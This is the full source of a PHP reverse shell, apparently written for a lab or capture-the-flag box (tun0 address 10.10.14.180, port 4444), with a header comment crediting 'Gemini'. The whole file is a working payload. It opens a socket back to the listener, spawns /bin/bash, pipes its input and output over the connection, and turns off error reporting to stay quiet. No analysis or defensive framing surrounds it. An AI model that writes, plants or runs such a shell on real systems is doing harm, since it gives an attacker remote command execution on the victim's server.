<?php
// Simple PHP Reverse Shell
// Copyright (C) 2025 Gemini

// --- Configuration ---
$ip = '10.10.14.180';  // Your IP address (tun0)
$port = 4444;         // The port you are listening on with netcat

// --- Execution ---

// Turn off error reporting to keep the connection clean
error_reporting(0);
set_time_limit(0);

// Try to create a socket connection back to the attacker
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    print "Failed to connect.";
    exit(1);
}

// Create streams for standard input, output, and error
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin
   1 => array("pipe", "w"),  // stdout
   2 => array("pipe", "w")   // stderr
);

// Spawn a new bash process
$process = proc_open('/bin/bash', $descriptorspec, $pipes);

if (is_resource($process)) {
    // Set streams to non-blocking mode
    stream_set_blocking($pipes[0], 0); // stdin
    stream_set_blocking($pipes[1], 0); // stdout
    stream_set_blocking($pipes[2], 0); // stderr
    stream_set_blocking($sock, 0);

    // Main loop to shovel data between the socket and the bash process
    while (true) {
        // Check for data from the socket (attacker's commands)
        $read = array($sock, $pipes[1], $pipes[2]);
        $write = NULL;
        $except = NULL;

        if (stream_select($read, $write, $except, 30) === false) {
            break; // Connection lost
        }

        // Data from socket -> bash stdin
        if (in_array($sock, $read)) {
            $input = fread($sock, 1024);
            fwrite($pipes[0], $input);
        }

        // Data from bash stdout -> socket
        if (in_array($pipes[1], $read)) {
            $output = fread($pipes[1], 1024);
            fwrite($sock, $output);
        }

        // Data from bash stderr -> socket
        if (in_array($pipes[2], $read)) {
            $error = fread($pipes[2], 1024);
            fwrite($sock, $error);
        }
    }

    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}
?>